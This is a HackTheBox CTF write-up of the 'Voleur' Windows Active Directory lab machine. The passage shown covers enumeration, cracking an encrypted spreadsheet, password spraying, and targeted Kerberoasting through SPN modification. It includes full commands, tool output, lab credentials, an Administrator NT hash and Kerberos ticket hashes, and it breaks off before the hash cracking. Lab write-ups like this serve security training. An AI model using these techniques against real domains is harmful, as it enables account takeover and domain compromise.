---
layout: ctf
title: "HackTheBox: Voleur"
platform: "HackTheBox"
type: "Machine"
difficulty: "Medium"
image: "/assets/img/ctf/voleur.png"
tags: [Windows, Active-Directory, Kerberos, ACL-Abuse, Targeted-Kerberoasting, DPAPI-Abuse, Backup-Service]
date: 2026-05-13
---

# 🎯 Voleur

**OS:** Windows | **Difficulty:** Medium | **IP:** `10.129.232.130`

![voleur.htb](/assets/img/ctf/data/voleur-htb.png)

---

## ⛓️ TL;DR / Attack Chain
1. **Initial Foothold:** Identified an encrypted `Access_Review.xlsx` on an `IT` share. Cracked the file using `office2john` (password: `football1`) to reveal a list of service account credentials and "crossed-out" leavers.
2. **User Pivot (Targeted Kerberoasting):** Authenticated as `svc_ldap` using credentials from the Excel sheet. Leveraged svc_ldap's membership in the `RESTORE_USERS` group to perform Targeted Kerberoasting on `svc_winrm`.
3. **Lateral Movement (DPAPI Abuse):** Used svc_winrm's session to execute `Restore-ADObject` as `svc_ldap`, bringing back the deleted user `Todd Wolfe`. Extracted Todd's DPAPI master keys and decrypted his stored credentials to compromise `Jeremy Combs`.
4. **Privilege Escalation:** Found an SSH private key for `svc_backup` in Jeremy's `IT` shares. SSH'd into the DC (port `2222`) where `svc_backup` had full sudo rights on the WSL side.
5. **Domain Admin:** Leveraged backup privileges to read the `ntds.dit` and registry hives, dumping the Administrator NT hash via `secretsdump`.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| :--- | :--- | :--- |
| `ryan.naylor` | `HollowOct31Nyt` | Initial access credentials provided for the engagement. |
| `svc_ldap` | `M1XyC9pW7qT5Vn` | Extracted from cracked `Access_Review.xlsx`. |
| `svc_winrm` | `AFireInsidedeOzarctica980219afi` | Captured via Targeted Kerberoasting and cracked. |
| `todd.wolfe` | `NightT1meP1dg3on14` | Found in Excel; account restored via AD Recycle Bin. |
| `jeremy.combs` | `qT3V9pLXyN7W4m` | Decrypted from Todd Wolfe's DPAPI Credential files. |
| `Administrator` | `e656e07c56d831611b577b160b259ad2` | Dumped from `ntds.dit` using `svc_backup` privileges. |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.232.130" ; DOMAIN="voleur.htb" ; USERNAME="ryan.naylor" ; PASSWORD='HollowOct31Nyt' && \
  # sudo timedatectl set-ntp off && \ # this in case ntpdate's work is reset automatically
  sudo ntpdate $DOMAIN && \
  echo "$IP $DOMAIN VOLEUR.HTB dc.voleur.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 05:06 +0200
Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.026s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 03:07:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62536/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62537/tcp open  msrpc         Microsoft Windows RPC
62539/tcp open  msrpc         Microsoft Windows RPC
62567/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-05-15T03:08:45
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.52 seconds
```

### BloodHound

```bash
$ bloodhound-python -d $DOMAIN -u $USERNAME -p $PASSWORD -ns $IP -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20260515050802_bloodhound.zip
```

### SMB

```bash
$ nxc smb $IP -u $USERNAME -p $PASSWORD --shares
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

NTLM authentication is disabled so we have to use Kerberos. For that, we have to generate `krb5.conf` first:
```bash
$ nxc smb dc.voleur.htb -u $USERNAME -p $PASSWORD -d $DOMAIN -k --generate-krb5-file voleur.krb5
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] krb5 conf saved to: voleur.krb5
SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=voleur.krb5
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt

$ export KRB5_CONFIG=$PWD/voleur.krb5
```
> `export KRB5_CONFIG=$PWD/voleur.krb5` is very important. It is the "Google Maps for Kerberos" - without it, it won't know where to ask. Kerberos always asks for *names* not *IPs*.

Now we try again with `-k` (Kerberos authentication):
```bash
$ nxc smb $IP -u $USERNAME -p $PASSWORD --shares -k -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SPIDER_PLUS 10.129.232.130  445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.232.130  445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.232.130  445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.232.130  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.232.130  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.232.130  445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.232.130  445    DC               [*]  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
SMB         10.129.232.130  445    DC               [*] Enumerated shares
SMB         10.129.232.130  445    DC               Share           Permissions     Remark
SMB         10.129.232.130  445    DC               -----           -----------     ------
SMB         10.129.232.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.130  445    DC               C$                              Default share
SMB         10.129.232.130  445    DC               Finance
SMB         10.129.232.130  445    DC               HR
SMB         10.129.232.130  445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.130  445    DC               IT              READ
SMB         10.129.232.130  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.232.130  445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS 10.129.232.130  445    DC               [+] Saved share-file metadata to "/home/tralsesec/.nxc/modules/nxc_spider_plus/10.129.232.130.json".
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.232.130  445    DC               [*] Total folders found:  27
SPIDER_PLUS 10.129.232.130  445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size average:    3.55 KB
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size max:        16.5 KB
SPIDER_PLUS 10.129.232.130  445    DC               [*] File unique exts:     5 (pol, ini, xlsx, inf, csv)
SPIDER_PLUS 10.129.232.130  445    DC               [*] Downloads successful: 7
SPIDER_PLUS 10.129.232.130  445    DC               [+] All files processed successfully.
```

---

## 🚪 2. Initial Foothold

Let's check out the files it downloaded:
```bash
$ cd ~/.nxc/modules/nxc_spider_plus/$IP/
$ tree
.
├── IT
│   └── First-Line Support
│       └── Access_Review.xlsx
└── SYSVOL
    └── voleur.htb
        └── Policies
            ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
            │   ├── GPT.INI
            │   └── MACHINE
            │       ├── Microsoft
            │       │   └── Windows NT
            │       │       ├── Audit
            │       │       │   └── audit.csv
            │       │       └── SecEdit
            │       │           └── GptTmpl.inf
            │       └── Registry.pol
            └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
                ├── GPT.INI
                └── MACHINE
                    └── Microsoft
                        └── Windows NT
                            └── SecEdit
                                └── GptTmpl.inf

17 directories, 7 files

$ cd IT/First-Line\ Support
$ strings Access_Review.xlsx
$ strings Access_Review.xlsx
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<encryption xmlns="http://schemas.microsoft.com/office/2006/encryption" xmlns:p="http://schemas.microsoft.com/office/2006/keyEncryptor/password" xmlns:c="http://schemas.microsoft.com/office/2006/keyEncryptor/certificate"><keyData saltSize="16" blockSize="16" keyBits="256" hashSize="64" cipherAlgorithm="AES" cipherChaining="ChainingModeCBC" hashAlgorithm="SHA512" saltValue="e9SYu1+

<SNIP>
```

An encrypted `.xslx` file. Hopefully we can crack it with `john`:
```bash
$ office2john Access_Review.xlsx > hash && \
  john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)
1g 0:00:00:01 DONE (2026-05-15 05:17) 0.5780g/s 480.9p/s 480.9c/s 480.9C/s football1..legolas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`football1`.

Let's open the file with `LibreOffice` and the password `football1`:

|                        |                                |                          |                                                                       |
| :--------------------- | :----------------------------- | :----------------------- | :-------------------------------------------------------------------- |
| ***User***             | ***Job Title***                | ***Permissions***        | ***Notes***                                                           |
| Ryan.Naylor            | First-Line Support Technician  | SMB                      | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.    |
| Marie.Bryant           | First-Line Support Technician  | SMB                      |                                                                       |
| Lacey.Miller           | Second-Line Support Technician | Remote Management Users  |                                                                       |
| ~~Todd.Wolfe~~         | Second-Line Support Technician | Remote Management Users  | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs           | Third-Line Support Technician  | Remote Management Users. | Has access to Software folder.                                        |
| Administrator          | Administrator                  | Domain Admin             | Not to be used for daily tasks!                                       |
|                        |                                |                          |                                                                       |
|                        |                                |                          |                                                                       |
| ***Service Accounts*** |                                |                          |                                                                       |
| svc\_backup            |                                | Windows Backup           | Speak to Jeremy!                                                      |
| svc\_ldap              |                                | LDAP Services            | P/W - M1XyC9pW7qT5Vn                                                  |
| svc\_iis               |                                | IIS Administration       | P/W - N5pXyW1VqM7CZ8                                                  |
| svc\_winrm             |                                | Remote Management        | Need to ask Lacey as she reset this recently.                         |

![voleur-1.htb](/assets/img/ctf/data/voleur-1.png)

Now save usernames and passwords and then password spray:
```bash
$ cat << EOF > users.txt
Ryan.Naylor
Marie.Bryant
Lacey.Miller
Todd.Wolfe
Jeremy.Combs
Administrator
svc_backup
svc_ldap
svc_iis
svc_winrm
EOF

$ cat << EOF > passwords.txt
Leaver
NightT1meP1dg3on14
M1XyC9pW7qT5Vn
N5pXyW1VqM7CZ8
EOF

$ nxc smb $IP -u users.txt -p passwords.txt -k --continue-on-success

SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [-] voleur.htb\Ryan.Naylor:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Marie.Bryant:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Lacey.Miller:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Todd.Wolfe:Leaver KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         10.129.232.130  445    DC               [-] voleur.htb\Jeremy.Combs:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Administrator:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_backup:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_ldap:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_iis:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_winrm:Leaver KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Ryan.Naylor:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Marie.Bryant:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Lacey.Miller:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Todd.Wolfe:NightT1meP1dg3on14 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         10.129.232.130  445    DC               [-] voleur.htb\Jeremy.Combs:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Administrator:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_backup:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_ldap:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_iis:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_winrm:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Ryan.Naylor:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Marie.Bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Lacey.Miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Todd.Wolfe:M1XyC9pW7qT5Vn KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         10.129.232.130  445    DC               [-] voleur.htb\Jeremy.Combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Ryan.Naylor:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Marie.Bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Lacey.Miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Todd.Wolfe:N5pXyW1VqM7CZ8 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         10.129.232.130  445    DC               [-] voleur.htb\Jeremy.Combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
```

![voleur-2.htb](/assets/img/ctf/data/voleur-2.png)

```
[+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
[+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
```

Looking at what both services can do in bloodhound:

![voleur-3.htb](/assets/img/ctf/data/voleur-3.png)

![voleur-4.htb](/assets/img/ctf/data/voleur-4.png)

---

## 📈 3.1 Privilege Escalation (`ryan.naylor` -> `svc_ldap` -> `svc_winrm`)

As `svc_ldap` has `WriteSPN` over `svc_winrm` we can modify the `servicePrincipleName` attribe of it, allowing us to perform a targeted Kerberoast attack.

First, we have to request a TGT (because NTLM authentication is disabled and we have to use kerberos):
```bash
$ impacket-getTGT voleur.htb/svc_ldap -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Saving ticket in svc_ldap.ccache
```

```bash
$ export KRB5CCNAME=svc_ldap.ccache
$ bloodyAD -d $DOMAIN --host dc.voleur.htb -k set object svc_winrm servicePrincipalName -v 'pwn/everything'
[+] svc_winrm's servicePrincipalName has been updated

$ impacket-GetUserSPNs -k -no-pass -dc-host dc.voleur.htb voleur.htb/svc_ldap -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name       MemberOf                                                PasswordLastSet             LastLogon                   Delegation
--------------------  ---------  ------------------------------------------------------  --------------------------  --------------------------  ----------
pwn/everything        svc_winrm  CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb  2025-01-31 10:10:12.398769  2025-01-29 16:07:32.711487



$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$acd2466540af577d5c637c3f0ed02f2b$6fd82c5d2930a9713281f03831531a03bb9330740f3fd3b6e6fee0970aea9d5ccc0852113dedd440e1b5e908644aa7887a6cedd96c6a1e7bfae6409b34f2e3f6ec955829fcbeb983b59de013317ac64bc29062b925afeeca69f46e423fe5366489cacb53b273e340c08e4e346e2bc010ae12bb02ff884778666fa69c70045f2447594a0c3c756b72f196980c0dc8bc45fc5f416fe6d885a060975978cf9eeb23940ac423757aaa04722a38d02e9df08dd473be7e3d4b9d6cde7f9975d0af2ed9377269b8068d32a1baad08bcad50cb5371a3c95c6f213fb4fcc190b5c25eb1469492dff0abb9ceb0fc0a569f2d55672239d6ba1554578bed3be105c1f578273acbd250df000afc02713658d5afd7beb3c2b88d0163901455749a04881ce713baceda264bcede3d41ac166b84f31d1e2dcb8cf4b7e994eadafce2dc2615ae83df8948741f2bf4c1b2a3b1f41590b09b212c1b21a4ec3becbbecb59776afa7e937545fe92fb1bfc8d48548eae1a9549bb5ef0442c77ca22c2ef85472215f1c3c7ce9a11330bb62c09aba57f1e668948cd79baa2fbe9214257fa5e9f25be480d0f2b9f65f84b35321e78a66960b77ab0faccaa542a2b2464f7eebdb6f62f9c820c9455d053ecd973fac5e73fefbbc023c9dde16afeace1bc722da2df7e1a3f1f9cfd98754b7b6f4738791b69204faf2d61420e1f42a141f60bd3deb3dde18f94a4f8c65d27ab592feca004ce1d7513e5d02c6941140fa34df789477963c59d80f385a1a59b5ca10493cf06259c177d5704d28f94ce165c8055602907f51b92dae2d8016752b196829952f626a81da8ff9c999f1c669c0999913f82dd2612ec8c3e5ac7bae507a5af45d5a0a2faa57177d0aef770d0909f85c523b2d37e342b4fcbf63dde493b5ebd5e5b6a8d7511402609602c2a6c606f9c47f682ae2263a5674b4333fa1f14198a2614651a59f1e7392035ef5ac6d7074a607fe122b54a670dbb5713774580c1256816734c456989c7ec036025d25c228dd8908d7fa6c4ef689a3681f04ffe9d0b18e68be0c8a4bc3e9fe1a358faf43500e434230d33a67ba796aea625fbffb1811629499a2147bd32ce1cc98478e5c0d31f460ec39e66263e54faff7c16fc498ab713758605866344c9bb94cdd852106a8122182f81e1b833c01b140e7c8cf21bda6e7584fbf81bf1ca2c31573c6cbc92241900b06e6f69ed3e6c3da67214ddce92c9a9f2315ffc18a2f76894f0c36c142e560184d139e19ef0fc1c36935d88f092fb7a35260f352e2fd0d3a0b24d562f9a9c75116d97f95462dd7db7a6bdf9cee0e363163c4f0da5b015a38510d146642406a802e5f06119dd6c4403c2a3799184e4d86e30440caa968d973f13edf59e3749858f5365d81b817bf71801b9f41dc935d9ce65f8b3048d2a428bf529e9ac41c25033c971a2ea0e9c48444894ee9f62e45f9ad3a50bdfb392fe744

$ python3 /opt/share/targetedKerberoast/targetedKerberoast.py -d voleur.htb --dc-host dc.voleur.htb -u svc_ldap@voleur.htb -k                                                                                                                         
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$459a8511c7551bbdbbbbe0629b1366b8$ee5e26bf666a225ee64eba58d5b51135a29fc19f3be9ff7aa9f14cc8720c38d95ddd4e21f680c0dd95d873e3cad62d3cdff79c208644c1b3a61620b4155bb4c6e6753d6842d9d6ee9db4d8fa4f9f1ded48397dac1630a6093ed5cec4e1c6180d031f1d682a3dbe20f3f793afdccbc171c7014e93fc58e4c789ab4169c931ae1582fa491c81ad395fda073d4fe8a3657bf0555b52b8f7ea95d0d5ef9c04aca38419785c3a732c2ce82e292a0744f72484e38be828a392194a2a4bf347fa368d8d6944732b148c347b0b6812bc10be65fba80b9350838f061d8d11eaec2827a38aed5c9fbf388c97b6ca71d75343c80ba23cf65334dbb5cc3197150a2dc3e3c1ea112a1389bd100490c1dc3b22caf1b6ef805af1b2803c417a77257f8225aac48cee0a6ae69795c02fc228522a272a7912a6d54dc078bfa244b879879f2eb09f72276c779baa7f79d9f3de404e1db51767f054ddb5e373b3e2c30ee9c6d7e7d1744a4496ebbdead1aa8ada8c77bce76a36fc5c8799fceb0792f41f9de2b006e4eea25ba5c262dd523051bf9240884bc1e9fd3f30391f1cb93a4737eab4e0f1b72f5e4469b8ecb1bedb006ce17f61f62aca7a38c2bf4605bfd629c9713f2c350d775d599dd3cf16bf00dda78d8ad905c5af2cb3f100ca370cef070f88234af99436ee0818a0b0cb9b471ca10483b33abdb5faf39db30f1cb96e77a1c0d35841455346b9765d4760bfe0095103606751b4420db2fa2502e6f1fae907334d3458b2c7bc315c05112c20b20940fe7e4f0017a980ce972fc07e70193d21d90ab3eed55dac416b62fd525a3becba266e7c8a15eb79048b9be031d99da2215ba0fa95648ba1bab0881de12ff8daed1137efa7e513427c57ae89d3af342ca2338e02d70887b0dc8e8de6a2bea23d969007a107fc7c9897892802aaba2449dc8260f4881a6290d240af09255faf3f685bd28ada7027657f705bd5ae25a892fb48264a7698c7a7e4892c64d9ca55fb0c76d4acf2faad41ec096326cdf89d7a2304a36558e52c4c73f2c5e0181b74b4306b9fdd437df561e93c9bc807c30cf955cd5ca18794f8bf6108f1f2c60fda200b1a566eab3fba2fc9ef33b948fbfecc69c3e8fed26c1f788e6359d5ac5ae2bfa0d61ff2522a53c0c2bab72b257fe71dd9ebdf0e170dae17a845b887cf7227caa236f3887689c992af857b839974ac48f0800b8f4fb1d39f060bd098f4728c9989f0ec4f0386098e3a8cfb5e2618e7fe1a6ce9bd1841c644ac24bf01e04255d44f0c286c280318248d2ca85c733058cfac23c6d662a33a3f782a923a973ccaf0ca8532b9e010bd5c74e47da20d65efa68dd9c5e7850440d221916ad54fef22bf3e2c60c2817647f5515dd43920c3f898ceceeea48da3e5c4d2ec3398b6c6b9f86d8194d9a2cf161c93b0e2effab00042ab507828e690ae1fb3e4002d43a42c607a274031ab456ca20a73
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$7a02ea609d2fb89bdbf8b49530fc90ac$2b4ea61a82b25156e8fe49b9554d8db1744e591236e6e5c53026f93388c1d9b68b63a04ed30ed08f861ecd17f8b8e38520ea3828017d4b9205ca121c6949fe0d42082641c28d1a3c779f960823d81793e6751f5cbee3c91e25c2491e08ec41aa99ad3e80926eb5e32277d82dd60a2c9bdc92771058db63c15eb2a3c0df401f4506adeecb9d98b11de5418b895c333e2b8fa02ee42ab720d4e2073eab60455732c54c0e9597f8f4a78ae2df881ab7b3de98a673763cab81e7a7131c946b0fe2cace561ddf10578d4064576e9e1edcf7278537fa3c2ab24d80ebe33807ce8d589e147f43f5a6067a836435b084a2522cc37f5082db3a12dbce773cc2f4c698f2df544be6e0d755ff3fdcfb0672c3b903a12a836ed62cdfefbe30033f4e7187b24afaebbf775dfbbc4bd66fdc4e91ab4c9e84c4d389cd79f085ad7b9a12ab6e73ab9d8f7b736af0fa444ec2c5c3c4332bd6fdc4c5882511f2dbb180f5d8075cc35f0395cd9ecec61236cbe1a8041a74ab6f757179f2c7303215a04ea05484b25fff521afc4c4b65580405a9f05cfea1a6ceec5bf2171ee7a2004ca43d77e35f6bdaba7a504febdb7229ba0ca5394b73b31d187aa19099e5db708fca87da99a3815aa28125999bfce45bb372d130768040bfe7566e07cdc5eba46228e83aa81d800d16789add017513e5ff1f7d9c3c8a1d766fc5f21f16c38e13a4d0b1422b83d49c110a60263054d8a23d0dda649cdccd987d6df39184d3acc6a9c5654486e97c1e633a804e27acb77669244f29b5b447561684ddd02665fcbfa7124e399d58960e992b734745422a885903ea0e8121e9c69a4e045e777b87c217f6fb5882c78b67cf03f5d5687882214fb5204cf4375ec9e6922e36ed34617dd83634e3c03cecc25429e4894439f4f67d53b94f9beb2731bb238fd72ee0c140ddf86ab95e44aed107554ee21986dd30f984943b24e8b325b162d6aacb3a83796263564f024483e126d3ad3120b38731c983024076a640f538b511695db24a6152c41eeca63cdefcbf1471201039f64c04526ccb9d34cb6f35ab232edc18e5ad963b620952fb74d9177aa569fb5b7015006f76c8481a2a8b25ea49c140f8021fb20366eea75e300d3efd9d14679b3891c7c779adac43e80e8c9e6341b41787350abe7450a97020384356b5e08f7662d027bf9c7ab9dae726b8bd7feb97bd2c4f682a9225490cc3a1d4c6c74e2408e578dcbbcef096ac4f39414db0f90a0a1aa8cc3e65b2cbbf28ac2abecd733d4b21347659ad789d0172f62971147642b1db7f82c63521834eaf06cb18b9d4d063e2969d1397da2f9f73519c22f853d6a448f9bbe0b1eccc66b0447723ab70c8703b44571900bd29ebdfca5812a7965da3829e76b24d6ca85d4e0933ae3e8d46a9a07c9ae2b1c32befea720a7a2c322215d4aa9a409befe787e6919ad26c4f6e39b1fafef01afa8f97299185f5f4
```

It is critical to supplement standard enumeration with `targetedKerberoast.py` rather than relying solely on `impacket-GetUserSPNs`. While `GetUserSPNs` is limited to discovering accounts with pre-existing Service Principal Names (SPNs), `targetedKerberoast.py` proactively identifies accounts where the current user's permissions allow for the dynamic creation of a roastable state through ACL abuse. The reason `targetedKerberoast.py` saw `lacey.miller` and `impacket-GetUserSPNs` not, is because `svc_ldap` has `GenericWrite` over `lacey.miller` so `targetedKerberoast.py` did what it was created for :D

Now we can try to crack that with hashcat:
```bash
$ cat << 'EOF' > svc_winrm
